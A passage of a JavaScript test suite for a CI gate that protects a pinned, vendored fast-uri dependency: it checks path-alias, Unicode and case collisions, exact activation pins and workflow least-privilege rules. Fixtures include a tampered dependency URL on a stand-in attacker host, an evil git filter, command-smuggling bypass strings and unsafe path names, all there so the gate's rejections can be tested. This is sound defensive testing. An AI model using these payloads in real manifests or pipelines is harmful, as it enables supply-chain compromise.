  it("classifies both sides of a guarded-to-unguarded or unguarded-to-guarded rename", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    for (const file of [
      {
        status: "renamed",
        previous_filename: "vendor/npm/fast-uri/3.1.7/README.md",
        filename: "docs/reviewed-artifact.md",
      },
      {
        status: "renamed",
        previous_filename: "docs/reviewed-artifact.md",
        filename: "vendor/npm/fast-uri/3.1.7/README.md",
      },
    ]) {
      expect(classifyChangedFiles(policy, [file]).guarded.length, file.filename).toBeGreaterThan(0);
      const verdict = await judge({
        policy,
        tree: candidate({ tarball }),
        changedFiles: [file],
      });
      expect(verdict.failed, file.filename).toBe(true);
      expect(verdict.messages.join("\n"), file.filename).toMatch(/protected-path rename/);
    }
  });

  it("fails a renamed record that omits previous_filename", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    expect(
      validateChangedFileRecords(policy, [
        { status: "renamed", filename: "docs/reviewed-artifact.md" },
      ]),
    ).toContain("renamed pull-file record omits previous_filename");
    const verdict = await judge({
      policy,
      tree: candidate({ tarball }),
      changedFiles: [{ status: "renamed", filename: "docs/reviewed-artifact.md" }],
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/omits previous_filename/);
  });

  it("rejects a case-only protected rename even when a file listing calls it unrelated", async () => {
    const tarball = buildTarball(goodTarEntries());
    const baseTree = candidate({ tarball });
    const tree = candidate({ tarball });
    tree.treeEntries = tree.treeEntries.map(entry =>
      entry.path === "vendor/npm/fast-uri/3.1.7/README.md"
        ? { ...entry, path: "vendor/npm/fast-uri/3.1.7/readme.md" }
        : entry,
    );
    const verdict = await judge({
      policy: policyFor(tarball),
      baseTree,
      tree,
      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/ASCII-case collision|removes or moves/);
  });

  it("rejects Unicode composed/decomposed collisions beneath guarded vendor paths", async () => {
    const tarball = buildTarball(goodTarEntries());
    const baseTree = candidate({
      tarball,
      files: { "vendor/npm/fast-uri/3.1.7/caf\u00e9.txt": "base" },
    });
    const tree = candidate({
      tarball,
      files: { "vendor/npm/fast-uri/3.1.7/cafe\u0301.txt": "head" },
    });
    const verdict = await judge({
      policy: policyFor(tarball),
      baseTree,
      tree,
      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
    });
    expect(normalizeRepositoryPath("vendor\\npm\\fast-uri")).toBeNull();
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/Unicode-normalization collision/);
  });

  it("rejects backslash, control, and dot-segment paths from immutable tree data", async () => {
    const tarball = buildTarball(goodTarEntries());
    for (const unsafePath of [
      "vendor\\npm\\fast-uri\\3.1.7\\README.md",
      "vendor/npm/fast-uri/3.1.7/\u0000README.md",
      "vendor/npm/fast-uri/3.1.7/../README.md",
    ]) {
      const baseTree = candidate({ tarball });
      const tree = candidate({ tarball });
      tree.treeEntries = tree.treeEntries.map(entry =>
        entry.path === "vendor/npm/fast-uri/3.1.7/README.md"
          ? { ...entry, path: unsafePath }
          : entry,
      );
      const verdict = await judge({
        policy: policyFor(tarball),
        baseTree,
        tree,
        changedFiles: [{ status: "modified", filename: "docs/index.md" }],
      });
      expect(verdict.failed, unsafePath).toBe(true);
      expect(verdict.messages.join("\n"), unsafePath).toMatch(/unsafe path/);
    }
  });

  it("fails incomplete pull-files data when immutable trees show a protected change", async () => {
    const tarball = buildTarball(goodTarEntries());
    const baseTree = candidate({ tarball });
    const tree = withoutReviewedArtifact(candidate({ tarball }));
    const verdict = await judge({
      policy: policyFor(tarball),
      baseTree,
      tree,
      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
      changedFilesTruncated: true,
    });
    expect(verdict.toJSON()).toMatchObject({ conclusion: "failure", mode: "unbounded-change" });
    expect(verdict.messages.join("\n")).toMatch(/pull-file listing was incomplete/);
  });

  it("does not let artifact disappearance bypass an unguarded pull-file classification", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      baseTree: candidate({ tarball }),
      tree: withoutReviewedArtifact(candidate({ tarball })),
      changedFiles: [{ status: "modified", filename: "docs/index.md" }],
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/removes or moves a reviewed dependency artifact/);
  });

  it("uses the immutable diff to stop a two-PR metadata/listing bypass", async () => {
    const tarball = buildTarball(goodTarEntries());
    const baseTree = candidate({ tarball });
    const altered = structuredClone(PACKAGE_JSON);
    altered.devDependencies["fast-uri"] = "file:vendor/npm/fast-uri/3.1.7/other.tgz";
    const tree = candidate({
      tarball,
      files: { "package.json": JSON.stringify(altered) },
    });
    const immutable = diffImmutableTrees(baseTree.treeEntries, tree.treeEntries);
    expect(immutable.changes.map(change => change.filename)).toContain("package.json");
    const verdict = await judge({
      policy: policyFor(tarball),
      baseTree,
      tree,
      changedFiles: [
        {
          status: "modified",
          filename: ".github/trusted-policy/dependency-artifact-policy.json",
        },
      ],
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.toJSON().mode).toBe("mixed-trusted-and-guarded");
  });

  it("rejects a base update race as well as a force-push", async () => {
    const tarball = buildTarball(goodTarEntries());
    const verdict = await judge({
      policy: policyFor(tarball),
      tree: candidate({ tarball }),
      changedPaths: GUARDED_CHANGE,
      currentBaseSha: "c".repeat(40),
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/base moved during validation/);
  });

  it("fails closed for every protected case alias, even when the canonical path is absent", async () => {
    const tarball = buildTarball(goodTarEntries());
    const aliases = [
      ".NPMRC",
      "NPM-SHRINKWRAP.JSON",
      "Package.json",
      "PACKAGE-LOCK.JSON",
      ".GitHub/trusted-policy/dependency-artifact-policy.json",
      "Vendor/npm/fast-uri/3.1.7/README.md",
      "\u017fcripts/trusted/github-app-jwt.mjs",
      "scr\u0131pts/trusted/github-app-jwt.mjs",
    ];
    for (const path of aliases) {
      const classified = classifyChangedPaths(realPolicy, [path]);
      expect(classified.aliases, path).toContain(path);
      const baseTree = candidate({ tarball });
      const tree = candidate({ tarball });
      tree.treeEntries = tree.treeEntries.filter(entry => entry.path !== path);
      tree.treeEntries.push({
        path,
        mode: "100644",
        type: "blob",
        sha: gitBlobId(Buffer.from("alias\n", "utf8")),
        size: 6,
      });
      const verdict = await judge({
        policy: policyFor(tarball),
        baseTree,
        tree,
        changedFiles: [{ status: "modified", filename: "docs/index.md" }],
      });
      expect(verdict.failed, path).toBe(true);
      expect(verdict.toJSON().mode, path).toBe("path-alias");
    }
  });

  it("rejects ordinary case-sensitive paths only when they collide with a protected identity", () => {
    expect(classifyChangedPaths(realPolicy, ["docs/Readme.md"]).aliases).toHaveLength(0);
    expect(
      collectProtectedPathIdentityProblems(
        realPolicy,
        [{ path: "docs/Readme.md" }],
        [{ path: "docs/readme.md" }],
      ),
    ).toEqual(expect.arrayContaining([expect.stringMatching(/ASCII-case collision/)]));
  });

  it("retains NFC canonical spelling while rejecting backslash and NFD aliases", () => {
    const composed = canonicalRepositoryPathIdentity("vendor/npm/fast-uri/3.1.7/caf\u00e9.txt");
    const decomposed = canonicalRepositoryPathIdentity("vendor/npm/fast-uri/3.1.7/cafe\u0301.txt");
    expect(composed.canonical).toBe("vendor/npm/fast-uri/3.1.7/caf\u00e9.txt");
    expect(decomposed.canonical).toBe(composed.canonical);
    expect(decomposed.folded).toBe(composed.folded);
    expect(canonicalRepositoryPathIdentity("vendor\\npm\\x").unsafe).toBe(true);
  });

  it("rejects checkout-unsafe path segments through the shared canonicalizer", () => {
    for (const path of [
      "vendor/npm/\u0085control.txt",
      "vendor/npm/\u202ereversed.txt",
      "vendor/npm/file.txt:payload",
      "vendor/npm/trailing.",
      "vendor/npm/trailing ",
      "vendor/npm/CON",
      "vendor/npm/con.txt",
      "vendor/npm/NUL .txt",
      "vendor/npm/LPT1.json",
      "vendor/npm/COM¹.log",
      "vendor/npm/GIT~1/config",
      "vendor/npm/README~1.MD",
      "vendor/npm/.GiT/config",
      "vendor/npm/.g\u200cit/config",
      "vendor/npm/.g\u0131t/config",
      "vendor/npm/invalid?.txt",
      "vendor/npm/invalid*.txt",
      "vendor/npm/invalid|.txt",
      "vendor/npm/invalid<.txt",
    ]) {
      expect(canonicalRepositoryPathIdentity(path).unsafe, path).toBe(true);
      expect(isUnsafeRepositoryPath(path), path).toBe(true);
      expect(normalizeRepositoryPath(path), path).toBeNull();
    }
  });

  it("rejects every checkout-unsafe alias in post-activation trees and pull-file records", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = candidate({ tarball });
    for (const path of [
      "docs/\u0085control.md",
      "docs/\u202ereversed.md",
      "docs/readme.md:payload",
      "docs/trailing.",
      "docs/trailing ",
      "docs/CON.txt",
      "docs/README~1.MD",
      "docs/.g\u200cit/config",
      "docs/.g\u0131t/config",
      "docs/invalid?.md",
      "docs/invalid*.md",
    ]) {
      expect(
        validateChangedFileRecords(policy, [{ status: "added", filename: path }]),
        path,
      ).toEqual(expect.arrayContaining([expect.stringMatching(/unsafe path/)]));
      const tree = candidate({ tarball, extraPaths: [path] });
      const verdict = await judge({
        policy,
        baseTree,
        tree,
        changedFiles: [{ status: "added", filename: path }],
      });
      expect(verdict.failed, path).toBe(true);
      expect(verdict.messages.join("\n"), path).toMatch(/unsafe path/);
    }
  });

  it("applies the same segment safety rules to exact, prefix, suffix, and basename policy entries", () => {
    for (const mutate of [
      policy => policy.guardedPaths.exact.push("vendor/CON.txt"),
      policy => policy.guardedPaths.prefixes.push("vendor./"),
      policy => policy.guardedPaths.suffixes.push("/file.txt:stream"),
      policy => policy.forbiddenTree.basenames.push("LPT1.json"),
    ]) {
      const policy = structuredClone(realPolicy);
      mutate(policy);
      expect(() => assertPolicyShape(policy)).toThrow(/unsafe path/);
    }
  });

  it("rejects directory/file prefix collisions and NFC aliases in the full tree map", () => {
    const problems = collectProtectedPathIdentityProblems(
      realPolicy,
      [{ path: "package.json" }, { path: "vendor/npm/fast-uri/3.1.7/caf\u00e9.txt" }],
      [
        { path: "package.json/child" },
        { path: "vendor/npm/fast-uri/3.1.7/cafe\u0301.txt" },
      ],
    );
    expect(problems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/directory\/file prefix collision/),
        expect.stringMatching(/Unicode-normalization collision/),
      ]),
    );
  });

});

describe("authoritative gate — exact activation and rotation", () => {
  it("accepts the complete exact activation set and rejects extra or changed bytes", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = activationBaseTree(tarball, policy);
    const tree = activationTree(tarball, policy);
    const activationPaths = [...policy.activation.allowedFiles];
    const accepted = await judge({
      policy,
      baseTree,
      tree,
      changedFiles: activationChangedFiles(policy),
      artifactRequired: false,
    });
    expect(accepted.toJSON()).toMatchObject({ conclusion: "success", mode: "activation" });

    const extra = candidate({
      tarball,
      files: {
        ...Object.fromEntries(
          activationPaths.map(path => [
            path,
            baselineFiles(tarball)[path] ?? `activation fixture: ${path}\n`,
          ]),
        ),
        "scripts/not-approved.mjs": "malicious\n",
      },
    });
    const extraVerdict = await judge({
      policy,
      baseTree,
      tree: extra,
      changedFiles: [
        ...activationChangedFiles(policy),
        { status: "added", filename: "scripts/not-approved.mjs" },
      ],
      artifactRequired: false,
    });
    expect(extraVerdict.failed).toBe(true);
    expect(extraVerdict.messages.join("\n")).toMatch(/exact policy-approved activation file set/);

    const changedPackage = JSON.stringify({
      ...PACKAGE_JSON,
      devDependencies: { ...PACKAGE_JSON.devDependencies, evil: "https://evil.example/x.tgz" },
    });
    const tampered = activationTree(tarball, policy);
    tampered.treeEntries = tampered.treeEntries.map(entry =>
      entry.path === "package.json"
        ? {
            ...entry,
            sha: gitBlobId(Buffer.from(changedPackage, "utf8")),
            size: Buffer.byteLength(changedPackage, "utf8"),
          }
        : entry,
    );
    const originalRead = tampered.readBlob;
    tampered.readBlob = async (sha, path) =>
      path === "package.json"
        ? Buffer.from(changedPackage, "utf8")
        : originalRead(sha, path);
    const changedVerdict = await judge({
      policy,
      baseTree,
      tree: tampered,
      changedFiles: activationChangedFiles(policy),
      artifactRequired: false,
    });
    expect(changedVerdict.failed).toBe(true);
    expect(changedVerdict.messages.join("\n")).toMatch(/activation file.*approved bytes|pinned file/);
  });

  it("rejects every partial pre-activation manifest, lock, attribute, verifier, workflow, test, or documentation change", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = activationBaseTree(tarball, policy);
    for (const path of [
      "package.json",
      "package-lock.json",
      ".gitattributes",
      "scripts/verify-fast-uri-artifact.mjs",
      ".github/workflows/security-scan.yml",
      "tests/spa/fast-uri-artifact-race.test.mjs",
      "vendor/npm/fast-uri/3.1.7/README.md",
    ]) {
      const complete = activationTree(tarball, policy);
      const allowed = new Set([path]);
      const partial = {
        ...complete,
        treeEntries: [
          ...baseTree.treeEntries.filter(entry => !allowed.has(entry.path)),
          ...complete.treeEntries.filter(entry => allowed.has(entry.path)),
        ],
      };
      const verdict = await judge({
        policy,
        baseTree,
        tree: partial,
        changedFiles: [{
          status: policy.activation.basePins[path].absent === true ? "added" : "modified",
          filename: path,
        }],
        artifactRequired: false,
      });
      expect(verdict.toJSON(), path).toMatchObject({
        conclusion: "failure",
        mode: "activation-rejected",
      });
      expect(verdict.messages.join("\n"), path).toMatch(/exact policy-approved activation file set/);
    }
  });

  it("rejects activation when a target mode or immutable base pin differs", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = activationBaseTree(tarball, policy);
    const wrongMode = activationTree(tarball, policy);
    wrongMode.treeEntries = wrongMode.treeEntries.map(entry =>
      entry.path === "package.json" ? { ...entry, mode: "100755" } : entry,
    );
    const modeVerdict = await judge({
      policy,
      baseTree,
      tree: wrongMode,
      changedFiles: activationChangedFiles(policy),
      artifactRequired: false,
    });
    expect(modeVerdict.failed).toBe(true);
    expect(modeVerdict.messages.join("\n")).toMatch(/approved Git blob and mode|approved mode/);

    const wrongBase = activationBaseTree(tarball, policy);
    wrongBase.treeEntries = wrongBase.treeEntries.map(entry =>
      entry.path === "package.json" ? { ...entry, sha: "f".repeat(40) } : entry,
    );
    const baseVerdict = await judge({
      policy,
      baseTree: wrongBase,
      tree: activationTree(tarball, policy),
      changedFiles: activationChangedFiles(policy),
      artifactRequired: false,
    });
    expect(baseVerdict.failed).toBe(true);
    expect(baseVerdict.messages.join("\n")).toMatch(/approved base blob and mode/);
  });

  it("rejects ordinary post-activation manifest, lock, attribute, verifier, workflow, test, and documentation mutations", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = activationTree(tarball, policy);
    for (const [path, value] of [
      ["package.json", JSON.stringify({ ...PACKAGE_JSON, scripts: { verify: "evil" } })],
      ["package-lock.json", JSON.stringify({ ...PACKAGE_LOCK, packages: { ...PACKAGE_LOCK.packages, "node_modules/extra": { version: "1.0.0" } } })],
      [".gitattributes", `${GITATTRIBUTES}vendor/** filter=evil\n`],
      ["scripts/verify-fast-uri-artifact.mjs", `${VERIFIER_SOURCE}\n// mutation\n`],
      [".github/workflows/sri-check.yml", "name: spoof\n"],
      ["tests/spa/fast-uri-artifact-race.test.mjs", "// assertions removed\n"],
      ["vendor/npm/fast-uri/3.1.7/README.md", "# substituted documentation\n"],
    ]) {
      const changed = activationTree(tarball, policy);
      const bytes = Buffer.from(value, "utf8");
      const old = changed.treeEntries.find(entry => entry.path === path);
      changed.treeEntries = changed.treeEntries.map(entry =>
        entry.path === path
          ? { ...entry, sha: gitBlobId(bytes), size: bytes.length }
          : entry,
      );
      const originalRead = changed.readBlob;
      changed.readBlob = async (sha, requestedPath) =>
        requestedPath === path ? bytes : originalRead(sha, requestedPath);
      const verdict = await judge({
        policy,
        baseTree,
        tree: changed,
        changedPaths: [path],
      });
      expect(verdict.failed, path).toBe(true);
      expect(verdict.messages.join("\n"), path).toMatch(/pinned file|activation file|does not match/);
      expect(old).toBeDefined();
    }
  });

  it("rejects a post-activation executable-bit change even when bytes are unchanged", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const baseTree = activationTree(tarball, policy);
    const changed = activationTree(tarball, policy);
    changed.treeEntries = changed.treeEntries.map(entry =>
      entry.path === "scripts/verify-fast-uri-artifact.mjs"
        ? { ...entry, mode: "100755" }
        : entry,
    );
    const verdict = await judge({
      policy,
      baseTree,
      tree: changed,
      changedFiles: [{
        status: "modified",
        filename: "scripts/verify-fast-uri-artifact.mjs",
      }],
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/approved mode/);
  });
});

/* ------------------------------------------------------------------ *
 * 6. Candidate documentation is byte-pinned, not shell-token parsed
 * ------------------------------------------------------------------ */

describe("authoritative gate — candidate documentation is inert exact data", () => {
  it("does not retain a shell-token denylist control", () => {
    const source = readText("scripts", "trusted", "verify-dependency-artifact-gate.mjs");
    expect(source).not.toContain("scanDocumentForForbiddenCommands");
    expect(source).not.toContain("commandProgram");
    expect(source).not.toContain("documentScan");
  });

  it("requires the candidate vendor README to match the protected byte pin", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const unsafeReadme = ["# Reviewed", "", "npm ci", ""].join("\n");
    const verdict = await judge({
      policy,
      tree: candidate({
        tarball,
        files: { "vendor/npm/fast-uri/3.1.7/README.md": unsafeReadme },
      }),
      changedPaths: GUARDED_CHANGE,
    });
    expect(verdict.failed).toBe(true);
    expect(verdict.messages.join("\n")).toMatch(/README\.md.*does not match base policy|README\.md.*expected/);
  });

  it("rejects wrapper and quoting bypasses because no candidate command is accepted", async () => {
    const tarball = buildTarball(goodTarEntries());
    const policy = policyFor(tarball);
    const bypasses = [
      "command npm ci",
      "env SAFE=1 npm ci",
      "C:\\\\Program Files\\\\nodejs\\\\npm.cmd ci",
      "npm.exe ci",
      "& npm ci",
      "function npm { Invoke-Expression $args }; npm ci",
      "npm `\nci",
      "$(npm ci)",
    ];
    for (const command of bypasses) {
      const verdict = await judge({
        policy,
        tree: candidate({
          tarball,
          files: {
            "vendor/npm/fast-uri/3.1.7/README.md": `# Candidate\n\n\`\`\`powershell\n${command}\n\`\`\`\n`,
          },
        }),
        changedPaths: GUARDED_CHANGE,
      });
      expect(verdict.failed, command).toBe(true);
      expect(verdict.messages.join("\n"), command).toMatch(/README\.md.*does not match base policy|README\.md.*expected/);
    }
  });
});

/* ------------------------------------------------------------------ *
 * 7. Static trust-boundary assertions on the workflow itself
 * ------------------------------------------------------------------ */

describe("trusted-dependency-artifact workflow — static trust boundary", () => {
  const runBodies = () => {
    const bodies = [];
    const lines = gateWorkflow.split("\n");
    for (let index = 0; index < lines.length; index += 1) {
      const match = lines[index].match(/^(\s*)run:\s*(\|.*)?$/);
      if (!match) {
        const inline = lines[index].match(/^\s*run:\s+(.+)$/);
        if (inline) bodies.push(inline[1]);
        continue;
      }
      const indent = match[1].length;
      const body = [];
      for (let scan = index + 1; scan < lines.length; scan += 1) {
        if (lines[scan].trim() !== "" && lines[scan].search(/\S/) <= indent) break;
        body.push(lines[scan]);
      }
      bodies.push(body.join("\n"));
    }
    return bodies;
  };

  it("is triggered by pull_request_target against main only", () => {
    expect(gateWorkflow).toMatch(/on:\s*\n\s*pull_request_target:/);
    expect(gateWorkflow).toMatch(/branches: \[main\]/);
    expect(gateWorkflow).toMatch(
      /types: \[opened, synchronize, reopened, ready_for_review\]/,
    );
    // No path filter: a skipped run would leave the required check missing.
    const trigger = gateWorkflow.slice(
      gateWorkflow.indexOf("on:"),
      gateWorkflow.indexOf("permissions: {}"),
    );
    expect(trigger).not.toContain("paths:");
  });

  it("never checks out, merges or fetches the candidate head", () => {
    expect(gateWorkflow).not.toMatch(/pull_request\.head\.ref/);
    expect(gateWorkflow).not.toMatch(/pull_request\.merge_commit_sha/);
    expect(gateWorkflow).not.toMatch(/refs\/pull\//);
    expect(gateWorkflow).not.toMatch(/ref:\s*\$\{\{\s*github\.event\.pull_request\.head/);
    const checkoutRefs = [...gateWorkflow.matchAll(/^\s*ref:\s*(.+)$/gm)].map(m => m[1].trim());
    expect(checkoutRefs.length).toBeGreaterThan(0);
    for (const ref of checkoutRefs) {
      expect(ref).toBe("${{ github.event.pull_request.base.sha }}");
    }
  });

  it("discards checkout credentials in every job", () => {
    const checkouts = gateWorkflow.match(/uses: actions\/checkout@/g) ?? [];
    const disabled = gateWorkflow.match(/persist-credentials: false/g) ?? [];
    expect(checkouts.length).toBeGreaterThan(0);
    expect(disabled.length).toBe(checkouts.length);
  });

  it("grants the minimum scopes and keeps write away from candidate data", () => {
    expect(gateWorkflow).toMatch(/^permissions: \{\}$/m);
    const preflight = gateWorkflow.slice(gateWorkflow.indexOf("  preflight:"));
    expect(preflight).toMatch(/permissions:\n\s+contents: read\n/);
    expect(preflight).not.toMatch(/checks:\s*write/);
    expect(preflight).not.toMatch(/security-events/);
    expect(preflight).not.toMatch(/pull-requests:\s*write/);
  });

  it("runs no npm, npx, package script or candidate code", () => {
    for (const body of runBodies()) {
      expect(body).not.toMatch(/\bnpm\b/);
      expect(body).not.toMatch(/\bnpx\b/);
      expect(body).not.toMatch(/\byarn\b/);
    }
    expect(gateWorkflowCode).not.toMatch(/npm ci/);
    expect(gateWorkflowCode).not.toMatch(/actions\/github-script/);
    expect(gateWorkflowCode).not.toMatch(/cache:/);
    expect(gateWorkflowCode).not.toMatch(/upload-artifact/);
    expect(gateWorkflowCode).not.toMatch(/download-artifact/);
  });

  it("never interpolates candidate data into a shell body", () => {
    for (const body of runBodies()) {
      expect(body).not.toContain("${{");
    }
  });

  it("passes candidate-controlled values only through env, and validates them", () => {
    expect(gateWorkflow).toMatch(/GATE_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
    expect(gateWorkflow).toMatch(/GATE_BASE_REF: \$\{\{ github\.event\.pull_request\.base\.ref \}\}/);
    const gateSource = readText("scripts", "trusted", "verify-dependency-artifact-gate.mjs");
    expect(gateSource).toMatch(/FULL_OBJECT_ID\.test\(String\(eventHeadSha/);
    expect(gateSource).not.toMatch(/child_process/);
    expect(gateSource).not.toMatch(/\beval\(/);
    expect(gateSource).not.toMatch(/new Function/);
    expect(gateSource).not.toMatch(/node:vm/);
  });

  it("captures immutable base and head identities but never publishes a required check", () => {
    expect(gateWorkflow).toMatch(/GATE_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
    expect(gateWorkflow).toMatch(/GATE_BASE_SHA: \$\{\{ github\.event\.pull_request\.base\.sha \}\}/);
    expect(gateWorkflowCode).not.toMatch(/checks:\s*write/);
    expect(gateWorkflowCode).not.toMatch(/publish-gate-check/);
    expect(gateWorkflowCode).not.toMatch(/trusted-dependency-artifact\s+on the pull request head/i);
  });
});

describe("security-scan workflow — least privilege hardening", () => {
  const securityScan = readText(".github", "workflows", "security-scan.yml");

  it("does not grant security-events write to jobs that do not upload security events", () => {
    expect(securityScan).toMatch(/^permissions: \{\}$/m);
    expect(securityScan).not.toMatch(/security-events:\s*write/);
    for (const job of ["python-audit", "npm-audit"]) {
      const start = securityScan.indexOf(`  ${job}:`);
      const nextOffset = securityScan
        .slice(start + 1)
        .search(/\n  [A-Za-z0-9_-]+:/);
      const body = securityScan.slice(
        start,
        nextOffset < 0 ? undefined : start + 1 + nextOffset,
      );
      expect(body, job).toMatch(/permissions:\n\s+contents: read/);
    }
  });

  it("drops checkout credentials in both scanning jobs", () => {
    const checkouts = securityScan.match(/uses: actions\/checkout@/g) ?? [];
    const disabled = securityScan.match(/persist-credentials: false/g) ?? [];
    expect(checkouts).toHaveLength(2);
    expect(disabled).toHaveLength(2);
  });
});

/* ------------------------------------------------------------------ *
 * 8. Verdict messaging remains bounded
 * ------------------------------------------------------------------ */

describe("authoritative gate — verdict messaging", () => {
  it("bounds message count and length", () => {
    const verdict = new Verdict({ maxMessages: 3, maxMessageLength: 10 });
    for (let index = 0; index < 10; index += 1) verdict.note(`message-${index}-padding`);
    expect(verdict.messages).toHaveLength(3);
    expect(verdict.messages[0].length).toBeLessThanOrEqual(10);
    expect(sanitizeToken("a\nb\tc", 10)).toBe("a b c");
  });
});

/* ------------------------------------------------------------------ *
 * 9. The committed policy itself
 * ------------------------------------------------------------------ */

describe("trusted policy document", () => {
  it("parses, validates, and pins the reviewed fast-uri artifact", () => {
    expect(() => assertPolicyShape(realPolicy)).not.toThrow();
    expect(realPolicy.package.tar.sha256).toBe(
      "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
    );
    expect(realPolicy.package.tar.size).toBe(43760);
    expect(realPolicy.package.tar.fileCount).toBe(44);
    expect(realPolicy.package.integrity).toBe(
      "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
    );
    expect(realPolicy.package.dependentRange).toBe("^3.0.1");
    expect(realPolicy.verifierPolicyLiterals.requiredAdvisories).toHaveLength(6);
  });

  it("pins a base-relative activation patch with no trusted-path overlap", () => {
    expect(realPolicy.activation.strategy).toBe("base-relative-exact-tree-delta");
    expect(realPolicy.activation.requiredBasePolicyVersion).toBe(realPolicy.policyVersion);
    expect(realPolicy.activation.patchSha256).toBe(activationPatchDigest(realPolicy.activation));
    expect(
      realPolicy.activation.allowedFiles.filter(path => realPolicy.trustedPaths.includes(path)),
    ).toEqual([]);
    expect(realPolicy.activation.allowedFiles).not.toContain("SECURITY.md");
    expect(realPolicy.activation.approvedCommit).toBeUndefined();
    expect(realPolicy.activation.approvedParent).toBeUndefined();
    for (const [path, expected] of [
      [
        "package.json",
        {
          mode: "100644",
          blob: "3faa4f4fae4eeee55a35ddc1a99c58a9bcf5ad1c",
          sha256: "2a3fad19f3341087ff12656bcd7ea2f09359fb9103911a8c54285aa6b5fa6ab9",
          size: 1083,
        },
      ],
      [
        "package-lock.json",
        {
          mode: "100644",
          blob: "0b764c5ed9b507d9d8f259f9be8ea4dd77a47661",
          sha256: "19e6cfc9c195248e3ef6d2827048d786b0f629be0a680b5f88648694321d4a2c",
          size: 76925,
        },
      ],
      [
        ".gitattributes",
        {
          mode: "100644",
          blob: "91596cc419da4f86b6ed193802fc81b5b28a3ba1",
          sha256: "df7f40c6ed0da07a2cac77823f83af844b07fb4f49c4e049aaf8d2159cf20468",
          size: 936,
        },
      ],
    ]) {
      expect(realPolicy.activation.pins[path]).toEqual(expected);
      expect(realPolicy.digestPins[path]).toEqual({
        blob: expected.blob,
        sha256: expected.sha256,
        size: expected.size,
      });
    }
    expect(realPolicy.activation.basePins["package.json"]).toEqual({
      mode: "100644",
      blob: "e267a3b54bfbc2a7b7f3e37a3fc15a1b6ea1ba9d",
    });
    expect(realPolicy.activation.basePins["scripts/verify-fast-uri-artifact.mjs"]).toEqual({
      absent: true,
    });
    expect(Object.values(realPolicy.activation.pins).every(pin => pin.mode === "100644")).toBe(true);
    expect(realPolicy.activation.pins[".github/workflows/security-scan.yml"]).toEqual({
      mode: "100644",
      blob: "6e7ab1ffeb5fc9e779d1ee4ee5695ea534c72674",
      sha256: "b2db741bd09205c7ba396835f3c451b2a247b29e16390ebedeba3b2b84b3937b",
      size: 11976,
    });
  });

  it("rejects any trusted path added to the artifact activation transaction", () => {
    const policy = structuredClone(realPolicy);
    const path = "SECURITY.md";
    policy.activation.allowedFiles.push(path);
    policy.activation.basePins[path] = {
      mode: "100644",
      blob: "1".repeat(40),
    };
    policy.activation.pins[path] = {
      mode: "100644",
      blob: "2".repeat(40),
      sha256: "3".repeat(64),
      size: 1,
    };
    policy.activation.patchSha256 = activationPatchDigest(policy.activation);
    expect(() => assertPolicyShape(policy)).toThrow(/overlaps a trusted path/);
  });

  it("pins the exact current policy-tree base state for every future activation path", () => {
    for (const path of realPolicy.activation.allowedFiles) {
      const output = execFileSync("git", ["ls-files", "--stage", "--", path], {
        cwd: repoRoot,
        encoding: "utf8",
      }).trim();
      const expected = realPolicy.activation.basePins[path];
      if (expected.absent === true) {
        expect(output, path).toBe("");
        continue;
      }
      const match = /^(\d+)\s+([0-9a-f]{40})\s+\d+\t/.exec(output);
      expect(match, path).not.toBeNull();
      expect({ mode: match[1], blob: match[2] }, path).toEqual(expected);
    }
  });

  it("keeps the command-free template separately from the exact approved artifact README pin", () => {
    const template = readText(
      ".github",
      "trusted-policy",
      "vendor-readme-template.md",
    );
    const readme = realPolicy.documentation.vendorReadme;
    expect(readme.path).toBe("vendor/npm/fast-uri/3.1.7/README.md");
    expect(readme.sha256).toBe(
      "d868e4fe7640a21489ba2ece7018290e2cd01c05e463e99194b0c3ec5116efc7",
    );
    expect(readme.size).toBe(17916);
    expect(readme.templateSha256).toBe(sha256(Buffer.from(template, "utf8")));
    expect(readme.templateSize).toBe(Buffer.byteLength(template, "utf8"));
    expect(realPolicy.digestPins[readme.path]).toEqual({
      blob: "5bb6e480b36df794921065ad59035349e45d147b",
      sha256: readme.sha256,
      size: readme.size,
    });
    expect(template).not.toMatch(/```|npm|npx|yarn|pnpm|powershell/i);
  });

  it("guards every path a dependency-artifact change can travel through", () => {
    for (const path of [
      "package.json",
      "package-lock.json",
      "npm-shrinkwrap.json",
      ".npmrc",
      ".gitattributes",
      "scripts/verify-fast-uri-artifact.mjs",
      "scripts/verify-fast-uri-bootstrap.mjs",
    ]) {
      expect(classifyChangedPaths(realPolicy, [path]).guarded, path).toContain(path);
    }
    expect(classifyChangedPaths(realPolicy, ["vendor/npm/other/x.tgz"]).guarded).toHaveLength(1);
